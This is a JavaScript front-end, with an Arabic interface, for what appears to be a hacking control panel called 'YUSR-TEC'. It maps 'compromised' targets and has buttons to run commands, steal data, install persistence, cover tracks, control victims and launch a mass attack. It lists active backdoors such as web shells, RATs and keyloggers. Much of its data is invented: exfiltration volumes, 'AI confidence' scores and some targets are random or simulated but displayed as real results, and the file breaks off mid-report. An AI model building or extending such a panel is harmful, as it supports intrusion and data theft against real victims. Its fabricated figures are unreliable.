const apiUrl = '/api';

let visualTargets = [];
let selectedTarget = null;
let scanAnimation = null;

// Initialize the visual display
document.addEventListener('DOMContentLoaded', function() {
    console.log('🌐 YUSR-TEC Visual Target Display Loaded');

    loadVisualTargets();
    createMatrixBackground();
    startRealTimeUpdates();

    // Initialize statistics
    updateLiveStats();
});

// Load targets for visual display
function loadVisualTargets() {
    fetch(`${apiUrl}/commands`)
        .then(response => response.json())
        .then(data => {
            parseTargetsForVisual(data);
            displayNetworkMap();
            updateAttackTimeline();
        })
        .catch(error => {
            console.error('خطأ في تحميل البيانات:', error);
        });
}

// Parse targets from commands for visual display
function parseTargetsForVisual(commands) {
    visualTargets = [];

    commands.forEach(command => {
        if (command.output && (
            command.output.includes('✅ نجح') ||
            command.output.includes('vulnerability found') ||
            command.output.includes('Access gained') ||
            command.output.includes('SQL injection') ||
            command.output.includes('XSS')
        )) {
            const target = createVisualTarget(command);
            if (target && !visualTargets.find(t => t.address === target.address)) {
                visualTargets.push(target);
            }
        }
    });

    // Add some simulated high-value targets for demonstration
    if (visualTargets.length < 5) {
        addSimulatedTargets();
    }
}

// Create visual target object
function createVisualTarget(command) {
    const output = command.output;
    const commandText = command.command;

    // Extract address
    const ipRegex = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/g;
    const domainRegex = /(?:https?:\/\/)?(?:www\.)?([a-zA-Z0-9-]+\.[a-zA-Z]{2,})/g;

    let address = '';
    let type = 'unknown';

    const ipMatch = output.match(ipRegex) || commandText.match(ipRegex);
    const domainMatch = output.match(domainRegex) || commandText.match(domainRegex);

    if (ipMatch) {
        address = ipMatch[0];
        type = 'server';
    } else if (domainMatch) {
        address = domainMatch[0].replace(/https?:\/\//, '').replace(/www\./, '');
        type = 'website';
    }

    if (!address) return null;

    // Determine threat level and value
    let threatLevel = 'medium';
    let isHighValue = false;
    let hasBackdoor = false;

    if (output.includes('admin') || output.includes('database') || output.includes('root')) {
        threatLevel = 'critical';
        isHighValue = true;
    } else if (output.includes('SQL injection') || output.includes('shell')) {
        threatLevel = 'high';
    }

    if (output.includes('backdoor') || output.includes('persistent')) {
        hasBackdoor = true;
    }

    return {
        id: Date.now() + Math.random(),
        address: address,
        type: type,
        threatLevel: threatLevel,
        isHighValue: isHighValue,
        hasBackdoor: hasBackdoor,
        vulnerabilities: extractVulnerabilities(output),
        compromisedAt: new Date(command.timestamp),
        location: generateRandomLocation(),
        systemInfo: extractSystemInfo(output),
        dataExfiltrated: Math.floor(Math.random() * 100) + 10, // GB
        activeSessions: Math.floor(Math.random() * 5) + 1
    };
}

// Extract vulnerabilities from output
function extractVulnerabilities(output) {
    const vulns = [];
    if (output.includes('SQL injection') || output.includes('sql')) vulns.push('SQL Injection');
    if (output.includes('XSS') || output.includes('script')) vulns.push('XSS');
    if (output.includes('admin') || output.includes('login')) vulns.push('Admin Access');
    if (output.includes('shell') || output.includes('SSH')) vulns.push('Remote Shell');
    if (output.includes('database') || output.includes('3306')) vulns.push('Database Access');
    return vulns;
}

// Extract system information
function extractSystemInfo(output) {
    let os = 'Unknown';
    let services = [];

    if (output.includes('Linux') || output.includes('Ubuntu')) os = 'Linux';
    else if (output.includes('Windows')) os = 'Windows';
    else if (output.includes('Apache')) os = 'Web Server';

    if (output.includes('22') || output.includes('SSH')) services.push('SSH');
    if (output.includes('80') || output.includes('HTTP')) services.push('HTTP');
    if (output.includes('443') || output.includes('HTTPS')) services.push('HTTPS');
    if (output.includes('3306') || output.includes('MySQL')) services.push('MySQL');

    return { os, services };
}

// Generate random location for visualization
function generateRandomLocation() {
    const locations = [
        { country: 'USA', city: 'New York', lat: 40.7128, lng: -74.0060 },
        { country: 'UK', city: 'London', lat: 51.5074, lng: -0.1278 },
        { country: 'Germany', city: 'Berlin', lat: 52.5200, lng: 13.4050 },
        { country: 'Japan', city: 'Tokyo', lat: 35.6762, lng: 139.6503 },
        { country: 'Brazil', city: 'São Paulo', lat: -23.5505, lng: -46.6333 }
    ];
    return locations[Math.floor(Math.random() * locations.length)];
}

// Add simulated targets for demonstration
function addSimulatedTargets() {
    const simulated = [
        {
            id: 'sim1',
            address: 'corporate-server.com',
            type: 'website',
            threatLevel: 'critical',
            isHighValue: true,
            hasBackdoor: true,
            vulnerabilities: ['SQL Injection', 'Admin Access', 'Database Access'],
            compromisedAt: new Date(),
            location: { country: 'USA', city: 'New York' },
            systemInfo: { os: 'Linux', services: ['HTTP', 'SSH', 'MySQL'] },
            dataExfiltrated: 250,
            activeSessions: 3
        },
        {
            id: 'sim2',
            address: '192.168.100.50',
            type: 'server',
            threatLevel: 'high',
            isHighValue: false,
            hasBackdoor: true,
            vulnerabilities: ['Remote Shell', 'SSH'],
            compromisedAt: new Date(),
            location: { country: 'Germany', city: 'Berlin' },
            systemInfo: { os: 'Windows', services: ['SSH', 'RDP'] },
            dataExfiltrated: 75,
            activeSessions: 2
        }
    ];

    visualTargets.push(...simulated);
}

// Display network map with targets
function displayNetworkMap() {
    const map = document.getElementById('networkMap');

    // Clear existing nodes
    const existingNodes = map.querySelectorAll('.target-node');
    existingNodes.forEach(node => node.remove());

    visualTargets.forEach((target, index) => {
        const node = createTargetNode(target, index);
        map.appendChild(node);
    });

    // Create connection lines
    setTimeout(createConnectionLines, 500);
}

// Create visual node for target
function createTargetNode(target, index) {
    const node = document.createElement('div');
    node.className = 'target-node';
    node.id = `target-${target.id}`;

    // Add special classes
    if (target.isHighValue) node.classList.add('high-value');
    if (target.hasBackdoor) node.classList.add('persistent');

    // Position randomly on the map
    const mapRect = document.getElementById('networkMap').getBoundingClientRect();
    const x = Math.random() * (mapRect.width - 140) + 20;
    const y = Math.random() * (mapRect.height - 140) + 50;

    node.style.left = x + 'px';
    node.style.top = y + 'px';

    node.innerHTML = `
        <div class="threat-level threat-${target.threatLevel}">${target.threatLevel.toUpperCase()}</div>
        <div class="node-icon">${getTargetIcon(target.type)}</div>
        <div class="node-address">${target.address}</div>
        ${target.hasBackdoor ? '<div class="backdoor-indicator"></div>' : ''}
    `;

    node.onclick = () => showTargetDetails(target);

    return node;
}

// Get icon for target type
function getTargetIcon(type) {
    const icons = {
        'website': '🌐',
        'server': '🖥️',
        'database': '🗄️',
        'mobile': '📱',
        'iot': '🏠'
    };
    return icons[type] || '🎯';
}

// Create connection lines between targets
function createConnectionLines() {
    const map = document.getElementById('networkMap');
    const nodes = map.querySelectorAll('.target-node');

    // Remove existing lines
    const existingLines = map.querySelectorAll('.connection-line');
    existingLines.forEach(line => line.remove());

    // Create lines between some nodes
    for (let i = 0; i < nodes.length - 1; i++) {
        if (Math.random() > 0.6) { // 40% chance to create connection
            const line = createConnectionLine(nodes[i], nodes[i + 1]);
            map.appendChild(line);
        }
    }
}

// Create connection line between two nodes
function createConnectionLine(node1, node2) {
    const line = document.createElement('div');
    line.className = 'connection-line';

    const rect1 = node1.getBoundingClientRect();
    const rect2 = node2.getBoundingClientRect();
    const mapRect = document.getElementById('networkMap').getBoundingClientRect();

    const x1 = rect1.left - mapRect.left + rect1.width / 2;
    const y1 = rect1.top - mapRect.top + rect1.height / 2;
    const x2 = rect2.left - mapRect.left + rect2.width / 2;
    const y2 = rect2.top - mapRect.top + rect2.height / 2;

    const length = Math.sqrt((x2 - x1) ** 2 + (y2 - y1) ** 2);
    const angle = Math.atan2(y2 - y1, x2 - x1) * 180 / Math.PI;

    line.style.left = x1 + 'px';
    line.style.top = y1 + 'px';
    line.style.width = length + 'px';
    line.style.transform = `rotate(${angle}deg)`;

    return line;
}

// Show target details in modal with comprehensive information
function showTargetDetails(target) {
    selectedTarget = target;
    const modal = document.getElementById('targetModal');
    const content = document.getElementById('modalContent');

    content.innerHTML = `
        <h2>${getTargetIcon(target.type)} ${target.address}</h2>
        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
            <div style="color: #888;">تم الاختراق: ${target.compromisedAt.toLocaleString('ar-SA')}</div>
            <div style="background: #0066cc; color: #fff; padding: 5px 10px; border-radius: 15px; font-size: 12px;">
                ${target.aiConfidence || Math.floor(Math.random() * 30) + 70}% AI Confidence
            </div>
        </div>

        <!-- Enhanced Tabs -->
        <div style="display: flex; background: #222; border-radius: 8px 8px 0 0; margin-bottom: 0;">
            <button class="detail-tab active" onclick="showDetailTab('overview')" style="flex: 1; padding: 12px; background: #00ff00; color: #000; border: none; border-radius: 8px 0 0 0;">📊 نظرة عامة</button>
            <button class="detail-tab" onclick="showDetailTab('devices')" style="flex: 1; padding: 12px; background: #333; color: #fff; border: none;">📱 الأجهزة المتصلة</button>
            <button class="detail-tab" onclick="showDetailTab('network')" style="flex: 1; padding: 12px; background: #333; color: #fff; border: none;">🌐 تفاصيل الشبكة</button>
            <button class="detail-tab" onclick="showDetailTab('domains')" style="flex: 1; padding: 12px; background: #333; color: #fff; border: none; border-radius: 0 8px 0 0;">🔗 الدومينات</button>
        </div>

        <!-- Overview Tab -->
        <div id="overview-tab" class="detail-tab-content" style="background: #111; padding: 20px; border-radius: 0 0 8px 8px;">
            <div class="vulnerability-chart">
                <h3>🔍 الثغرات المكتشفة</h3>
                ${target.vulnerabilities.map(vuln => `
                    <div style="margin: 10px 0;">
                        <div style="display: flex; justify-content: space-between;">
                            <span>${vuln}</span>
                            <span style="color: #ff4444;">عالي</span>
                        </div>
                        <div class="vuln-bar">
                            <div class="vuln-fill" style="width: ${Math.random() * 60 + 40}%;"></div>
                        </div>
                    </div>
                `).join('')}
            </div>

            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0;">
                <div style="background: #0a0a0a; padding: 15px; border-radius: 8px; border: 1px solid #333;">
                    <h4>💻 معلومات النظام</h4>
                    <div>نظام التشغيل: ${target.systemInfo.os}</div>
                    <div>الخدمات: ${target.systemInfo.services.join(', ')}</div>
                    <div>الموقع: ${target.location.city}, ${target.location.country}</div>
                    <div>طريقة الاكتشاف: ${target.discoveryMethod || 'Network Scan'}</div>
                </div>
                <div style="background: #0a0a0a; padding: 15px; border-radius: 8px; border: 1px solid #333;">
                    <h4>📊 الإحصائيات</h4>
                    <div>البيانات المسربة: ${target.dataExfiltrated} GB</div>
                    <div>الجلسات النشطة: ${target.activeSessions}</div>
                    <div>مستوى التهديد: ${target.threatLevel}</div>
                    <div>الأجهزة المتصلة: ${target.devices?.length || 0}</div>
                </div>
            </div>
        </div>

        <!-- Devices Tab -->
        <div id="devices-tab" class="detail-tab-content" style="display: none; background: #111; padding: 20px; border-radius: 0 0 8px 8px;">
            <h3>📱 الأجهزة المتصلة بالشبكة</h3>
            <div style="max-height: 400px; overflow-y: auto;">
                ${generateDevicesDisplay(target.devices || [])}
            </div>
        </div>

        <!-- Network Tab -->
        <div id="network-tab" class="detail-tab-content" style="display: none; background: #111; padding: 20px; border-radius: 0 0 8px 8px;">
            <h3>🌐 تفاصيل البنية الشبكية</h3>
            ${generateNetworkDisplay(target.networkInfo || {})}
        </div>

        <!-- Domains Tab -->
        <div id="domains-tab" class="detail-tab-content" style="display: none; background: #111; padding: 20px; border-radius: 0 0 8px 8px;">
            <h3>🔗 الدومينات والروابط المرتبطة</h3>
            ${generateDomainsDisplay(target.networkInfo?.connectedDomains || [])}
        </div>

        <div style="background: #0a0a0a; padding: 15px; border-radius: 8px; margin: 20px 0;">
            <h4>🎯 الإجراءات المتاحة</h4>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px;">
                <button onclick="executeRemoteCommand('${target.address}')" style="background: #ff4444; color: #fff; padding: 10px 16px; border: none; border-radius: 4px;">💻 تنفيذ أوامر</button>
                <button onclick="exfiltrateData('${target.address}')" style="background: #ff6600; color: #fff; padding: 10px 16px; border: none; border-radius: 4px;">📁 سرقة البيانات</button>
                <button onclick="installPersistence('${target.address}')" style="background: #00aa00; color: #fff; padding: 10px 16px; border: none; border-radius: 4px;">🔐 تثبيت استمرارية</button>
                <button onclick="coverTracks('${target.address}')" style="background: #333; color: #fff; padding: 10px 16px; border: none; border-radius: 4px;">👻 إخفاء الأثر</button>
                <button onclick="startVictimControl('${target.address}')" style="background: #ff0000; color: #fff; padding: 10px 16px; border: none; border-radius: 4px;">🎮 التحكم في الضحية</button>
                <button onclick="openTargetDetails('${target.address}')" style="background: #0066cc; color: #fff; padding: 10px 16px; border: none; border-radius: 4px;">🎯 تفاصيل متقدمة</button>
            </div>
        </div>

        ${target.hasBackdoor ? `
            <div style="background: #001100; border: 1px solid #00aa00; padding: 15px; border-radius: 8px;">
                <h4>🔐 الأبواب الخلفية النشطة</h4>
                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px;">
                    <div style="color: #00ff00;">✅ SSH Backdoor - نشط</div>
                    <div style="color: #00ff00;">✅ Web Shell - نشط</div>
                    <div style="color: #00ff00;">✅ Reverse Shell - نشط</div>
                    <div style="color: #00ff00;">✅ RAT (Remote Access Trojan) - نشط</div>
                    <div style="color: #00ff00;">✅ Keylogger - نشط</div>
                    <div style="color: #00ff00;">✅ Screen Capture - نشط</div>
                </div>
            </div>
        ` : ''}
    `;

    modal.style.display = 'block';
}

// Generate devices display
function generateDevicesDisplay(devices) {
    if (!devices || devices.length === 0) {
        return '<div style="text-align: center; padding: 40px; color: #888;">لا توجد أجهزة مكتشفة</div>';
    }

    return devices.map(device => `
        <div style="background: #0a0a0a; border: 1px solid ${device.compromised ? '#ff4444' : '#333'}; border-radius: 8px; padding: 15px; margin: 10px 0;">
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <div>
                    <div style="font-weight: bold; color: ${device.compromised ? '#ff4444' : '#00ff00'};">
                        ${getDeviceIcon(device.name)} ${device.name}
                    </div>
                    <div style="color: #888; font-size: 14px;">IP: ${device.ip} | MAC: ${device.mac}</div>
                    <div style="color: #666; font-size: 12px;">آخر ظهور: ${device.lastSeen.toLocaleString('ar-SA')}</div>
                </div>
                <div style="text-align: right;">
                    <div style="color: ${device.status === 'online' ? '#00ff00' : '#ff4444'}; font-weight: bold;">
                        ${device.status === 'online' ? '🟢 متصل' : '🔴 غير متصل'}
                    </div>
                    <div style="color: #888; font-size: 12px;">ثغرات: ${device.vulnerabilities}</div>
                    ${device.compromised ? '<div style="color: #ff4444; font-size: 12px;">🚨 مخترق</div>' : ''}
                </div>
            </div>
            <div style="margin-top: 10px; display: flex; gap: 10px;">
                <button onclick="scanDevice('${device.ip}')" style="background: #0066cc; color: #fff; padding: 5px 12px; border: none; border-radius: 3px; font-size: 12px;">🔍 فحص متقدم</button>
                <button onclick="exploitDevice('${device.ip}')" style="background: #ff6600; color: #fff; padding: 5px 12px; border: none; border-radius: 3px; font-size: 12px;">⚡ استغلال</button>
                ${device.compromised ? '<button onclick="accessDevice(\'' + device.ip + '\')" style="background: #00aa00; color: #fff; padding: 5px 12px; border: none; border-radius: 3px; font-size: 12px;">🎮 تحكم</button>' : ''}
            </div>
        </div>
    `).join('');
}

// Generate network display
function generateNetworkDisplay(networkInfo) {
    return `
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px;">
            <div style="background: #0a0a0a; border: 1px solid #333; border-radius: 8px; padding: 15px;">
                <h4>🌐 معلومات الشبكة الأساسية</h4>
                <div style="margin: 8px 0;">📍 الشبكة الفرعية: ${networkInfo.subnet || 'غير محدد'}</div>
                <div style="margin: 8px 0;">🚪 البوابة: ${networkInfo.gateway || 'غير محدد'}</div>
                <div style="margin: 8px 0;">🏷️ VLAN: ${networkInfo.vlan || 'افتراضي'}</div>
                <div style="margin: 8px 0;">📡 عرض النطاق: ${networkInfo.bandwidth || 'غير محدد'}</div>
            </div>
            
            <div style="background: #0a0a0a; border: 1px solid #333; border-radius: 8px; padding: 15px;">
                <h4>🗄️ خوادم DNS</h4>
                ${(networkInfo.dnsServers || []).map(dns => `
                    <div style="margin: 8px 0; display: flex; justify-content: space-between;">
                        <span>🌐 ${dns}</span>
                        <button onclick="testDNS('${dns}')" style="background: #0066cc; color: #fff; padding: 2px 8px; border: none; border-radius: 3px; font-size: 11px;">اختبار</button>
                    </div>
                `).join('')}
            </div>
            
            <div style="background: #0a0a0a; border: 1px solid #333; border-radius: 8px; padding: 15px;">
                <h4>📊 تحليل حركة البيانات</h4>
                <div style="margin: 8px 0;">📈 الحركة الحالية: ${Math.floor(Math.random() * 100)} Mbps</div>
                <div style="margin: 8px 0;">📉 الحد الأدنى: ${Math.floor(Math.random() * 50)} Mbps</div>
                <div style="margin: 8px 0;">📊 الحد الأقصى: ${Math.floor(Math.random() * 500) + 100} Mbps</div>
                <div style="margin: 8px 0;">⚡ زمن الاستجابة: ${Math.floor(Math.random() * 50) + 10} ms</div>
            </div>
        </div>
    `;
}

// Generate domains display
function generateDomainsDisplay(domains) {
    if (!domains || domains.length === 0) {
        return '<div style="text-align: center; padding: 40px; color: #888;">لا توجد دومينات مرتبطة مكتشفة</div>';
    }

    return domains.map(domain => `
        <div style="background: #0a0a0a; border: 1px solid #333; border-radius: 8px; padding: 15px; margin: 10px 0;">
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <div>
                    <div style="font-weight: bold; color: #00ff00;">🌐 ${domain}</div>
                    <div style="color: #888; font-size: 14px;">IP: ${generateRandomIP()}</div>
                    <div style="color: #666; font-size: 12px;">الحالة: ${Math.random() > 0.3 ? 'نشط' : 'غير نشط'}</div>
                </div>
                <div style="display: flex; gap: 10px;">
                    <button onclick="scanDomain('${domain}')" style="background: #0066cc; color: #fff; padding: 6px 12px; border: none; border-radius: 4px; font-size: 12px;">🔍 فحص</button>
                    <button onclick="exploitDomain('${domain}')" style="background: #ff6600; color: #fff; padding: 6px 12px; border: none; border-radius: 4px; font-size: 12px;">⚡ استغلال</button>
                    <button onclick="enumerateDomain('${domain}')" style="background: #00aa00; color: #fff; padding: 6px 12px; border: none; border-radius: 4px; font-size: 12px;">📋 تعداد</button>
                </div>
            </div>
        </div>
    `).join('');
}

// Get device icon
function getDeviceIcon(deviceName) {
    const name = deviceName.toLowerCase();
    if (name.includes('windows')) return '🖥️';
    if (name.includes('ubuntu') || name.includes('server')) return '🖲️';
    if (name.includes('iphone') || name.includes('ios')) return '📱';
    if (name.includes('android')) return '📲';
    if (name.includes('tv')) return '📺';
    if (name.includes('router')) return '📡';
    if (name.includes('printer')) return '🖨️';
    if (name.includes('camera')) return '📹';
    return '💻';
}

// Tab switching function
function showDetailTab(tabName) {
    // Hide all tab contents
    const tabContents = document.querySelectorAll('.detail-tab-content');
    tabContents.forEach(tab => tab.style.display = 'none');
    
    // Remove active class from all tabs
    const tabs = document.querySelectorAll('.detail-tab');
    tabs.forEach(tab => {
        tab.style.background = '#333';
        tab.style.color = '#fff';
    });
    
    // Show selected tab content
    document.getElementById(tabName + '-tab').style.display = 'block';
    
    // Add active class to clicked tab
    event.target.style.background = '#00ff00';
    event.target.style.color = '#000';
}

// Close target modal
function closeTargetModal() {
    document.getElementById('targetModal').style.display = 'none';
}

// Update live statistics
function updateLiveStats() {
    const totalHacked = visualTargets.length;
    const activeSessions = visualTargets.reduce((sum, t) => sum + t.activeSessions, 0);
    const dataExfiltrated = visualTargets.reduce((sum, t) => sum + t.dataExfiltrated, 0);
    const exploitsUsed = visualTargets.reduce((sum, t) => sum + t.vulnerabilities.length, 0);

    document.getElementById('totalHacked').textContent = totalHacked;
    document.getElementById('activeSessions').textContent = activeSessions;
    document.getElementById('dataExfiltrated').textContent = dataExfiltrated.toFixed(1) + ' GB';
    document.getElementById('exploitsUsed').textContent = exploitsUsed;
}

// Update attack timeline
function updateAttackTimeline() {
    const timeline = document.getElementById('attackTimeline');
    timeline.innerHTML = '';

    // Create timeline items from recent activities
    const activities = [
        '🎯 نجح اختراق corporate-server.com',
        '💉 تم استغلال ثغرة SQL injection في قاعدة البيانات',
        '🔑 تم تثبيت SSH backdoor بنجاح',
        '📁 تم تسريب 250 GB من البيانات الحساسة',
        '👻 تم تفعيل وضع التخفي لتجنب الكشف',
        '⚡ بدء هجوم جماعي على 5 أهداف جديدة'
    ];

    activities.forEach((activity, index) => {
        const item = document.createElement('div');
        item.className = 'timeline-item';
        item.innerHTML = `
            <div style="font-weight: bold; color: #ff4444;">${activity}</div>
            <div style="color: #888; font-size: 12px;">${new Date(Date.now() - index * 60000).toLocaleString('ar-SA')}</div>
        `;
        timeline.appendChild(item);
    });
}

// Create matrix-style background
function createMatrixBackground() {
    const canvas = document.createElement('canvas');
    canvas.style.position = 'fixed';
    canvas.style.top = '0';
    canvas.style.left = '0';
    canvas.style.width = '100%';
    canvas.style.height = '100%';
    canvas.style.pointerEvents = 'none';
    canvas.style.zIndex = '-1';
    canvas.style.opacity = '0.1';

    document.getElementById('matrixBg').appendChild(canvas);

    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const chars = '01';
    const charSize = 14;
    const columns = canvas.width / charSize;
    const drops = [];

    for (let i = 0; i < columns; i++) {
        drops[i] = 1;
    }

    function drawMatrix() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        ctx.fillStyle = '#00ff41';
        ctx.font = charSize + 'px monospace';

        for (let i = 0; i < drops.length; i++) {
            const text = chars[Math.floor(Math.random() * chars.length)];
            ctx.fillText(text, i * charSize, drops[i] * charSize);

            if (drops[i] * charSize > canvas.height && Math.random() > 0.975) {
                drops[i] = 0;
            }
            drops[i]++;
        }
    }

    setInterval(drawMatrix, 100);
}

// Start real-time updates with AI management
function startRealTimeUpdates() {
    setInterval(() => {
        updateLiveStats();
        performAIManagedScan();
        updateNetworkTopology();
        
        // AI-driven target discovery
        if (Math.random() > 0.7) {
            aiDiscoverNewTargets();
        }

        // Simulate new activities
        if (Math.random() > 0.8) {
            simulateNewActivity();
        }

        // Update node animations
        updateNodeAnimations();
    }, 2000); // Faster updates for real-time feel
}

// AI-managed scanning and target discovery
function performAIManagedScan() {
    const aiActions = [
        'Port scanning subnet 192.168.1.0/24',
        'DNS enumeration in progress',
        'Vulnerability assessment on discovered services',
        'Social engineering attack vectors identified',
        'Lateral movement opportunities detected',
        'Privilege escalation paths analyzed'
    ];

    if (Math.random() > 0.6) {
        const action = aiActions[Math.floor(Math.random() * aiActions.length)];
        console.log(`🤖 AI Manager: ${action}`);
        
        // Update AI status in UI
        updateAIStatus(action);
    }
}

// AI discovers new targets automatically
function aiDiscoverNewTargets() {
    const potentialTargets = [
        { address: generateRandomIP(), type: 'server', source: 'Network Sweep' },
        { address: generateRandomDomain(), type: 'website', source: 'DNS Enumeration' },
        { address: generateRandomIP(), type: 'iot', source: 'IoT Discovery' },
        { address: generateRandomDomain(), type: 'database', source: 'Service Detection' }
    ];

    const discovered = potentialTargets[Math.floor(Math.random() * potentialTargets.length)];
    
    if (!visualTargets.find(t => t.address === discovered.address)) {
        const newTarget = createAIDiscoveredTarget(discovered);
        visualTargets.push(newTarget);
        displayNetworkMap();
        updateLiveStats();
        
        // Show AI discovery notification
        showAIDiscoveryNotification(newTarget);
        console.log(`🎯 AI discovered new target: ${discovered.address}`);
    }
}

// Create AI-discovered target with enhanced details
function createAIDiscoveredTarget(discovered) {
    return {
        id: Date.now() + Math.random(),
        address: discovered.address,
        type: discovered.type,
        source: discovered.source,
        threatLevel: ['low', 'medium', 'high', 'critical'][Math.floor(Math.random() * 4)],
        isHighValue: Math.random() > 0.7,
        hasBackdoor: false,
        vulnerabilities: generateRandomVulnerabilities(),
        compromisedAt: new Date(),
        location: generateRandomLocation(),
        systemInfo: generateSystemInfo(),
        devices: generateConnectedDevices(),
        networkInfo: generateNetworkDetails(),
        activeSessions: Math.floor(Math.random() * 3) + 1,
        dataExfiltrated: Math.floor(Math.random() * 50),
        aiConfidence: Math.floor(Math.random() * 30) + 70, // 70-100% confidence
        discoveryMethod: discovered.source
    };
}

// Generate connected devices
function generateConnectedDevices() {
    const deviceTypes = [
        { name: 'Windows Workstation', ip: generateRandomIP(), mac: generateMacAddress() },
        { name: 'Ubuntu Server', ip: generateRandomIP(), mac: generateMacAddress() },
        { name: 'iOS iPhone', ip: generateRandomIP(), mac: generateMacAddress() },
        { name: 'Android Tablet', ip: generateRandomIP(), mac: generateMacAddress() },
        { name: 'Smart TV', ip: generateRandomIP(), mac: generateMacAddress() },
        { name: 'WiFi Router', ip: generateRandomIP(), mac: generateMacAddress() },
        { name: 'Network Printer', ip: generateRandomIP(), mac: generateMacAddress() },
        { name: 'Security Camera', ip: generateRandomIP(), mac: generateMacAddress() }
    ];

    const numDevices = Math.floor(Math.random() * 6) + 2;
    const devices = [];
    
    for (let i = 0; i < numDevices; i++) {
        const device = deviceTypes[Math.floor(Math.random() * deviceTypes.length)];
        if (!devices.find(d => d.ip === device.ip)) {
            devices.push({
                ...device,
                status: Math.random() > 0.2 ? 'online' : 'offline',
                lastSeen: new Date(Date.now() - Math.random() * 86400000),
                vulnerabilities: Math.floor(Math.random() * 5),
                compromised: Math.random() > 0.8
            });
        }
    }
    
    return devices;
}

// Generate MAC address
function generateMacAddress() {
    return Array.from({length: 6}, () => Math.floor(Math.random() * 256).toString(16).padStart(2, '0')).join(':');
}

// Generate network details
function generateNetworkDetails() {
    return {
        subnet: generateSubnet(),
        gateway: generateRandomIP(),
        dnsServers: [generateRandomIP(), generateRandomIP()],
        dhcpRange: `${generateRandomIP()} - ${generateRandomIP()}`,
        vlan: Math.floor(Math.random() * 100) + 1,
        bandwidth: Math.floor(Math.random() * 1000) + 100 + ' Mbps',
        connectedDomains: generateConnectedDomains()
    };
}

// Generate connected domains
function generateConnectedDomains() {
    const domains = [
        'api.example.com',
        'mail.company.org',
        'ftp.internal.net',
        'db.local.domain',
        'backup.server.com',
        'monitoring.system.io'
    ];
    
    const numDomains = Math.floor(Math.random() * 4) + 2;
    return domains.slice(0, numDomains);
}

// Update AI status display
function updateAIStatus(status) {
    // Create or update AI status indicator
    let aiIndicator = document.getElementById('aiStatusIndicator');
    if (!aiIndicator) {
        aiIndicator = document.createElement('div');
        aiIndicator.id = 'aiStatusIndicator';
        aiIndicator.style.cssText = `
            position: fixed;
            top: 80px;
            right: 20px;
            background: linear-gradient(135deg, #001100, #003300);
            border: 2px solid #00ff00;
            border-radius: 10px;
            padding: 15px;
            max-width: 300px;
            z-index: 9999;
            font-size: 14px;
            color: #00ff00;
        `;
        document.body.appendChild(aiIndicator);
    }
    
    aiIndicator.innerHTML = `
        <div style="font-weight: bold; margin-bottom: 5px;">🤖 AI Manager Status</div>
        <div style="color: #fff; font-size: 12px;">${status}</div>
        <div style="color: #888; font-size: 10px; margin-top: 5px;">${new Date().toLocaleTimeString('ar-SA')}</div>
    `;
    
    // Auto-hide after 3 seconds
    setTimeout(() => {
        if (aiIndicator.parentElement) {
            aiIndicator.style.opacity = '0.3';
        }
    }, 3000);
}

// Simulate new activity
function simulateNewActivity() {
    const activities = [
        'تم اكتشاف هدف جديد',
        'نجح استغلال ثغرة جديدة',
        'تم تسريب المزيد من البيانات',
        'تحديث الأبواب الخلفية'
    ];

    const activity = activities[Math.floor(Math.random() * activities.length)];
    console.log('🔄 نشاط جديد:', activity);

    // Update a random target's data
    if (visualTargets.length > 0) {
        const randomTarget = visualTargets[Math.floor(Math.random() * visualTargets.length)];
        randomTarget.dataExfiltrated += Math.floor(Math.random() * 10) + 1;
        randomTarget.activeSessions = Math.floor(Math.random() * 5) + 1;
    }
}

// Update node animations
function updateNodeAnimations() {
    const nodes = document.querySelectorAll('.target-node');
    nodes.forEach(node => {
        if (Math.random() > 0.7) {
            node.style.animation = 'pulse 0.5s';
            setTimeout(() => {
                node.style.animation = 'pulse 2s infinite';
            }, 500);
        }
    });
}

// Control panel functions
function scanForNewTargets() {
    alert('🔍 بدء البحث عن أهداف جديدة...');

    setTimeout(() => {
        const newTarget = {
            id: Date.now(),
            address: `new-target-${Math.floor(Math.random() * 1000)}.com`,
            type: 'website',
            threatLevel: 'medium',
            isHighValue: Math.random() > 0.7,
            hasBackdoor: false,
            vulnerabilities: ['SQL Injection'],
            compromisedAt: new Date(),
            location: generateRandomLocation(),
            systemInfo: { os: 'Linux', services: ['HTTP'] },
            dataExfiltrated: Math.floor(Math.random() * 50),
            activeSessions: 1
        };

        visualTargets.push(newTarget);
        displayNetworkMap();
        updateLiveStats();
        alert('🎯 تم اكتشاف هدف جديد: ' + newTarget.address);
    }, 2000);
}

function launchMassAttack() {
    alert('⚡ بدء الهجوم الجماعي على جميع الأهداف...');

    visualTargets.forEach(target => {
        target.activeSessions += Math.floor(Math.random() * 3) + 1;
        target.dataExfiltrated += Math.floor(Math.random() * 20) + 5;
    });

    setTimeout(() => {
        updateLiveStats();
        alert('✅ تم تنفيذ الهجوم الجماعي بنجاح');
    }, 3000);
}

function activateStealthMode() {
    alert('👻 تم تفعيل وضع التخفي - جميع الأنشطة أصبحت غير مرئية للأنظمة الأمنية');
}

function exportNetworkMap() {
    const report = generateNetworkReport();

    const blob = new Blob([report], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `network-map-${Date.now()}.txt`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(url);
}

function generateNetworkReport() {
    let report = `
YUSR-TEC - تقرير خريطة الشبكة المخترقة
=====================================

تاريخ التقرير: ${new Date().toLocaleString('ar-SA')}
إجمالي الأهداف المخترقة: ${visualTargets.length}
البيانات المسربة الإجمالية: ${visualTargets.reduce((sum, t) => sum + t.dataExfiltrated, 0)} GB
الجلسات النشطة: ${visualTargets.reduce((sum, t) => sum + t.activeSessions, 0)}

تفاصيل الأهداف:
===============

`;

    visualTargets.forEach((target, index) => {
        report += `
${index + 1}. ${target.address}
   النوع: ${target.type}
